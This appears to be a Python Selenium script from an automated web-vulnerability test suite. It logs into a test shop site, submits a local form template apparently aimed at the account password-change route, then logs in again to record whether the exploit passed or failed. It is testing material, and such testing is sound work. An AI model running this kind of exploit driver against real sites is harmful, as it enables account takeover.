import os
from phase4lib import check_login, update_results
from selenium import webdriver

browser = webdriver.Firefox("")
# Login to the website 
url = 'https://app8.com/upload/index.php?route=account/login'
browser.get(url)
browser.find_element_by_name('password').send_keys('test')
browser.find_element_by_name('email').send_keys('test@test.com')
browser.find_element_by_xpath("//form[@id='login']").submit()

# start executing

cur = os.getcwd()
browser.get(cur + "/formtemplate_0.html")
browser.find_element_by_xpath("//input[@type='submit' and @value='Submit']").submit()
injection_url = 'https://app8.com/upload/index.php?route=account/password'
browser.get(injection_url)
before = browser.page_source
browser.quit()

## Verification phase
browser = webdriver.Firefox("")
# Login to the website 
url = 'https://app8.com/upload/index.php?route=account/login'
browser.get(url)
browser.find_element_by_name('password').send_keys('test')
browser.find_element_by_name('email').send_keys('test@test.com')
browser.find_element_by_xpath("//form[@id='login']").submit()

# start executing
cur_url = browser.current_url
body = browser.page_source
outstr = "\Exploit URL: " + url + " "
result = check_login(body, cur_url, url)
if result:
	print '##### PASSED #####'
	update_results(outstr + " PASSED\n")
else:
	print '##### FAILED #####'
	update_results(outstr + " FAILED\n")

browser.quit()
